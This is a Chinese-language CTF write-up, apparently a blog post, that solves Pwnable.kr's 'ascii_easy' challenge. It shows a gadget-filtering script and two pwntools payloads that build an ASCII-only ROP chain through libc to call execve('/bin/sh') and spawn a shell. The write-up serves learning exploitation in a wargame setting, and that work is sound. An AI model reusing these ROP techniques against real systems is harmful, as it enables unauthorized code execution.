      <title>Pwnable.kr ascii_easy</title>
      <link href="/2020/05/05/Pwnable-kr-ascii-easy/"/>
      <url>/2020/05/05/Pwnable-kr-ascii-easy/</url>
      
        <content type="html"><![CDATA[<h1 id="Pwnable-kr-ascii-easy"><a href="#Pwnable-kr-ascii-easy" class="headerlink" title="Pwnable.kr ascii_easy"></a>Pwnable.kr ascii_easy</h1><p>直接 <code>ida</code> 中查看源码，<code>vuln</code> 中存在 <code>bof</code>:</p><p><img src="0x00.png" alt="0x00"></p><p>源码很简单，总结一下：</p><ul><li>开了 <code>nx</code></li><li><code>mmap</code> 在 <code>0x5555e000</code> 分配了一块内存，加载 <code>libc-2.15.so</code>，有全部权限（可执行）</li><li>输入只能是 <code>32</code> ~ <code>127</code> 的 <code>ascii</code> </li><li>栈溢出没有长度限制</li></ul><p>首先，拿到题目时，觉得应该看一下 <code>libc</code> 中哪些函数可以使用，简单的写了一个筛选的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">objdump -T libc<span class="number">-2.15</span>.so &gt; symbols</span><br><span class="line"></span><br><span class="line">-------------------------------------------------</span><br><span class="line"><span class="comment"># 筛选脚本(大致一样 ...)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fliter</span><span class="params">(addr)</span>:</span></span><br><span class="line">    a_78 = int(addr[<span class="number">2</span>:<span class="number">4</span>],<span class="number">16</span>)</span><br><span class="line">    a_56 = int(addr[<span class="number">4</span>:<span class="number">6</span>],<span class="number">16</span>)</span><br><span class="line">    a_34 = int(addr[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>)</span><br><span class="line">    a_12 = int(addr[<span class="number">8</span>:<span class="number">10</span>],<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span> is_ascii(a_78) <span class="keyword">and</span> is_ascii(a_56) <span class="keyword">and</span> is_ascii(a_34) <span class="keyword">and</span> is_ascii(a_12):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_ascii</span><span class="params">(num)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (num &gt; <span class="number">31</span> <span class="keyword">and</span> num &lt; <span class="number">128</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">"xxx"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">    addr = hex(<span class="number">0x5555e000</span> + int(i[<span class="number">2</span>:<span class="number">10</span>],<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">if</span> fliter(addr):</span><br><span class="line">        <span class="keyword">print</span> addr + i[<span class="number">10</span>:].strip(<span class="string">'\n'</span>)</span><br><span class="line">        </span><br><span class="line">------------------------------------------------</span><br><span class="line">python func.py &gt; filter</span><br><span class="line">cat filter | grep xxx</span><br></pre></td></tr></table></figure><p>简单的看了一下 <code>/bin/sh</code>、<code>execv</code>、<code>system</code>：</p><p><img src="0x01.jpg#pic_center" alt="0x01"></p><p><code>/bin/sh</code> 、<code>system</code> 不能直接使用 <code>ascii</code> 输入， <code>execv</code> 可以 …</p><p>这时，发现题目有提示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint : you don&#39;t necessarily have to jump at the beggining of a function. try to land anyware.</span><br></pre></td></tr></table></figure><p>i.e. 我们可以直接使用 <code>ROP</code> ，通过加加减减之类的让 <code>/bin/sh</code> 、<code>system</code> 这些函数的地址出现；于是，我选择了 <code>/bin/sh</code> 和 <code>execv</code>。</p><p>现在要构造 ROP chain，用 <code>ROPgadget</code> 和上面的那个脚本（稍微改改…）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary libc-2.15.so &gt; gadgets</span><br><span class="line">python func.py &gt; filtered_gadgets</span><br><span class="line">cat filtered_gadgets | grep xxx | grep xxx</span><br></pre></td></tr></table></figure><p>手动构造 ROP Chain（刺激）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">bin_sh = <span class="number">0x556bb7ec</span></span><br><span class="line">execv  = <span class="number">0x55616740</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x55687923 : add al, 0x8b ; inc eax ; push eax ; ret</span></span><br><span class="line"><span class="comment"># 0x5557506b : pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line"><span class="comment"># 0x555f3237 : add eax, esi ; pop ebx ; pop esi ; sub eax, 0x10 ; pop edi ; ret</span></span><br><span class="line"><span class="comment"># 0x5563704c : pushal ; ret</span></span><br><span class="line"><span class="comment"># 0x556d2a51 : pop ecx ; add al, 0xa ; ret</span></span><br><span class="line"><span class="comment"># 0x5557506f : pop ebp ; ret (pop1)</span></span><br><span class="line"><span class="comment"># 0x5557506c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret (pop4)</span></span><br><span class="line"><span class="comment"># 0x5557506d : pop esi ; pop edi ; pop ebp ; ret (pop3)</span></span><br><span class="line"><span class="comment"># 0x2b366078 + 0x2a35577e</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x1c</span> + <span class="string">'bbbb'</span> + p32(<span class="number">0x5557506b</span>) + p32(<span class="number">0x2b366074</span>) + <span class="string">'ebx '</span> +  p32(<span class="number">0x2a35577e</span>) + <span class="string">'edi '</span> + p32(<span class="number">0x5557506d</span>) + p32(<span class="number">0x555f3237</span>) + <span class="string">'ebx '</span> + <span class="string">'esi '</span> + p32(<span class="number">0x5557506f</span>) + p32(<span class="number">0x556d2a51</span>) + p32(execv) + p32(<span class="number">0x5563704c</span>)</span><br><span class="line"><span class="keyword">print</span> payload</span><br></pre></td></tr></table></figure><p>主要流程就是：</p><ul><li>‘a’*0x1c：填充缓冲区</li><li>‘bbbb’：old_ebp</li><li>p32(0x5557506b)：第一个 <code>gadget</code> ，主要目的控制 <code>eax</code> 和 <code>esi</code> ，之后用 <code>add eax, esi</code> 构造出 <code>/bin/sh</code> 的地址</li><li>p32(0x2b366074)：<code>pop eax</code> ，手动构造的第一个数据（可以随便选）</li><li>‘ebx ‘ ：<code>pop ebx</code></li><li>p32(0x2a35577e)：<code>pop esi</code> ，手动构造的第二个数据</li><li>‘edi ‘：<code>pop edi</code></li><li>p32(0x5557506d)：第六个 <code>gadget</code>，<code>pop ebp</code> 为后面的 <code>pushal</code> 后的 <code>ret</code> 服务</li><li>p32(0x555f3237)：第二个 <code>gadget</code>，主要使用 <code>add</code></li><li>‘ebx ‘：<code>pop ebx</code></li><li>‘esi ‘：<code>pop esi</code></li><li>p32(0x5557506f)：第五个 <code>gadget</code>，<code>pop1</code></li><li><p>p32(0x556d2a51)：第三个 <code>gadget</code>，控制 <code>ecx</code>，此时 <code>/bin/sh</code> 的地址也构建成功（0x2b366074 + 0x2a35577e - 0x10 + 0xa）</p></li><li><p>p32(execv)：主要是根据 <code>pushal</code> 之后的栈布局，决定把 <code>execv</code> 的地址传给 <code>ecx</code></p></li><li><p>p32(0x5563704c)：第四个 <code>gadget</code>，<code>pushal</code></p><p>指令执行的地址变化：</p><p><code>0x5557506b</code> =&gt; <code>0x555f3237</code> =&gt; <code>0x556d2a51</code> =&gt; <code>0x5563704c</code> =&gt; <code>0x5557506f</code> =&gt; <code>0x5557506d</code></p></li></ul><p>结果发现不行，调试时发现程序又 <code>push</code> 了 <code>ebx</code>，于是查看一下代码：</p><p><img src="0x02.png" alt="0x02"></p><p>并没有直接 <code>sub xxx</code>。后来查了一下，发现只有 <code>execve</code> 是内核级系统调用，剩下的几个 <code>exec</code> 都只是通过调用 <code>execve</code> 实现的。</p><p>于是，想要通过查找 <code>sub</code> | <code>add ecx</code> 来修改 <code>ecx</code> 的值，结果并没有找到。后来发现自己的之前的栈构造错了，并没有留 <code>execv</code> 的返回地址 …… 我还在想我太菜了。突然想起，直接找个 <code>call execve</code> 不就行了嘛，连栈布局都不用改。成功找到一个：</p><p> <img src="0x03.jpg#pic_center" alt="0x03"></p><p>红框的就可以用。修改后的 <code>payload</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">bin_sh = <span class="number">0x556bb7ec</span></span><br><span class="line">execv  = <span class="number">0x55616740</span></span><br><span class="line">execve = <span class="number">0x5561676a</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gadgets</span></span><br><span class="line"><span class="comment"># 0x55687923 : add al, 0x8b ; inc eax ; push eax ; ret</span></span><br><span class="line"><span class="comment"># 0x5557506b : pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line"><span class="comment"># 0x555f3237 : add eax, esi ; pop ebx ; pop esi ; sub eax, 0x10 ; pop edi ; ret</span></span><br><span class="line"><span class="comment"># 0x556c5375 : xor edi, ebp ; jmp eax</span></span><br><span class="line"><span class="comment"># 0x55687926 : push eax ; ret</span></span><br><span class="line"><span class="comment"># 0x5563704c : pushal ; ret</span></span><br><span class="line"><span class="comment"># 0x556d2a51 : pop ecx ; add al, 0xa ; ret</span></span><br><span class="line"><span class="comment"># 0x5557506f : pop ebp ; ret (pop1)</span></span><br><span class="line"><span class="comment"># 0x5557506c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret (pop4)</span></span><br><span class="line"><span class="comment"># 0x5557506d : pop esi ; pop edi ; pop ebp ; ret (pop3)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x1c</span> + <span class="string">'bbbb'</span> + p32(<span class="number">0x5557506b</span>) + p32(<span class="number">0x2b366074</span>) + <span class="string">'ebx '</span> +  p32(<span class="number">0x2a35577e</span>) + <span class="string">'edi '</span> + p32(<span class="number">0x5557506d</span>) + p32(<span class="number">0x555f3237</span>) + <span class="string">'ebx '</span> + <span class="string">'esi '</span> + p32(<span class="number">0x5557506f</span>) + p32(<span class="number">0x556d2a51</span>) + p32(execve) + p32(<span class="number">0x5563704c</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> payload</span><br></pre></td></tr></table></figure><p>输出都是 <code>ascii</code> ，直接把 <code>payload</code> 复制一下，特殊字符加个转义符号就行：</p><p><img src="0x04.jpg#pic_center" alt="0x04"></p><p>nice~ :）</p><h2 id="参阅"><a href="#参阅" class="headerlink" title="参阅"></a>参阅</h2><ul><li><a href="https://www.fermimn.edu.it/linux/quarta/x86/pusha.htm" target="_blank" rel="noopener">80386 Programmer’s Reference Manual — Opcode PUSHA</a></li></ul>]]></content>
      
      
